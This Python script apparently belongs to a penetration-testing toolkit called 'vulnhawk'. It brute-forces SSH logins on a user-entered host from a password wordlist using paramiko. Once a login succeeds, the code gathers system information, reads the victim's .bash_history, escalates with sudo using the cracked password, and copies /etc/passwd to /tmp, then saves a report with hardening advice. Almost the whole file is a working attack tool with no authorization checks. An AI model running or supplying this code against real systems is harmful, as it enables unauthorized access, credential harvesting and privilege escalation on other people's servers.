import paramiko
import os
import sys  # Import sys to handle exit
import time  # Import time for adding delays
import datetime

# Report class to gather and save the results
class Report:
    def __init__(self, target_ip, attack_type):
        self.target_ip = target_ip
        self.attack_type = attack_type
        self.date = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.vulnerabilities = []
        self.exploitation_attempts = []

    def add_vulnerability(self, description):
        self.vulnerabilities.append(description)

    def add_exploitation_attempt(self, description, success):
        status = "Success" if success else "Failed"
        self.exploitation_attempts.append(f"{description} - {status}")

    def generate_report(self):
        report_content = f"""
        SSH Exploitation Report
        =======================
        
        Target IP: {self.target_ip}
        Attack Type: {self.attack_type}
        Date: {self.date}
        
        Summary of Findings:
        --------------------
        Vulnerabilities Identified: {len(self.vulnerabilities)}
        Exploitation Attempts Made: {len(self.exploitation_attempts)}
        
        Detailed Vulnerabilities:
        -------------------------
        """
        for idx, vuln in enumerate(self.vulnerabilities, 1):
            report_content += f"{idx}. {vuln}\n"

        report_content += "\nExploitation Attempts:\n----------------------\n"
        for idx, attempt in enumerate(self.exploitation_attempts, 1):
            report_content += f"{idx}. {attempt}\n"

        report_content += "\nRecommendations:\n-----------------\n"
        report_content += "1. Ensure strong, unique passwords are used for all accounts.\n"
        report_content += "2. Disable root login over SSH if not required.\n"
        report_content += "3. Regularly update the SSH server and associated libraries.\n"
        report_content += "4. Implement two-factor authentication for SSH access.\n"

        report_content += "\nConclusion:\n-----------\n"
        report_content += "Review the identified vulnerabilities and apply the recommended actions to enhance the security of your SSH configuration.\n"

        return report_content

    def save_report(self):
        # Generate a unique filename with attack type and timestamp
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"vulnhawk_{self.attack_type}_report_{timestamp}.txt"
        report_content = self.generate_report()
        with open(filename, "w") as report_file:
            report_file.write(report_content)
        print(f"[+] Report saved as '{filename}'")

def execute_commands_on_victim(client, password):
    try:
        stdin, stdout, stderr = client.exec_command('whoami')
        current_user = stdout.read().decode().strip()
        print(f"Current User: {current_user}")

        print("\n[+] Gathering system information...")
        stdin, stdout, stderr = client.exec_command('uname -a')
        system_info = stdout.read().decode()
        print(f"System Info: {system_info}")

        print("\n[+] Checking hostname...")
        stdin, stdout, stderr = client.exec_command('hostname')
        hostname = stdout.read().decode()
        print(f"Hostname: {hostname}")

        print("\n[+] Listing files in the home directory...")
        stdin, stdout, stderr = client.exec_command('ls -la ~')
        home_files = stdout.read().decode()
        print(f"Home Directory Files:\n{home_files}")

        print("\n[+] Attempting to read .bash_history...")
        stdin, stdout, stderr = client.exec_command('cat ~/.bash_history')
        bash_history = stdout.read().decode()
        print(f".bash_history:\n{bash_history}")

        print("\n[+] Checking network configuration...")
        stdin, stdout, stderr = client.exec_command('ifconfig')
        network_info = stdout.read().decode()
        print(f"Network Info:\n{network_info}")

        # Attempt to gain root access
        print("\n[+] Attempting to gain root access...")

        if 'root' in current_user:
            print("[+] Already running as root.")
        else:
            # Send password to sudo and attempt to become root
            stdin, stdout, stderr = client.exec_command('sudo -S -p "" echo "Root access granted"')
            stdin.write(password + '\n')
            stdin.flush()
            sudo_result = stdout.read().decode()

            if "Root access granted" in sudo_result:
                print("[+] Root access granted.")
                # Once root, run commands as needed
                print("\n[+] Copying sensitive files as root...")
                stdin, stdout, stderr = client.exec_command('sudo cp /etc/passwd /tmp/passwd_copy')
                stdout.read()  # To ensure the command runs
                print("[+] /etc/passwd copied to /tmp/passwd_copy")
            else:
                print("[!] Root access denied or incorrect password for sudo.")

    except Exception as e:
        print(f"[!] An error occurred during command execution: {e}")

# Main function to handle the brute-force attack
def main():
    print("Starting Common Brute Force Attack...")
    
    host = input("Enter the target host IP: ")
    username = input("Enter the target username: ")

    # Initialize report with attack type
    report = Report(target_ip=host, attack_type="common_bruteforce")

    password_file_path = os.path.join(os.path.dirname(__file__), 'passwords.txt')

    # Check if the password file exists
    if not os.path.isfile(password_file_path):
        print(f"[!] The file '{password_file_path}' does not exist. Exiting.")
        return

    attempts = 0
    successful_password = None

    # Attempt to connect using each password from the list
    with open(password_file_path, "r") as password_list:
        for password in password_list:
            password = password.strip()
            print(f"Trying password: {password}")
            try:
                print(f"[{attempts}] Attempting Password: {password}")
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(hostname=host, username=username, password=password, timeout=1)
                
                print(f"[+] Connected with Password {password}")
                report.add_exploitation_attempt(f"Attempted SSH connection with password: {password}", True)
                successful_password = password
                execute_commands_on_victim(client, successful_password)
                client.close()
                break
            except paramiko.ssh_exception.AuthenticationException:
                print("Authentication failed.")
                report.add_exploitation_attempt(f"Attempted SSH connection with password: {password}", False)
            except Exception as e:
                print(f"An error occurred: {e}")
                report.add_exploitation_attempt(f"Attempted SSH connection with password: {password}", False)
            attempts += 1

    print("Common Brute Force Attack Completed.")
    time.sleep(2)  # Adding delay to observe the output

    # Save the report with a unique filename
    report.save_report()

    end_or_return()  # Call the function to ask the user what to do next

def end_or_return():
    choice = input("\n[1] Return to Main Menu\n[0] Exit\nSelect an option: ")
    if choice == '1':
        from main import main_menu  # Import the main_menu function from main.py
        main_menu()
    elif choice == '0':
        sys.exit()
    else:
        print("[!] Invalid selection.")
        end_or_return()

if __name__ == "__main__":
    main()
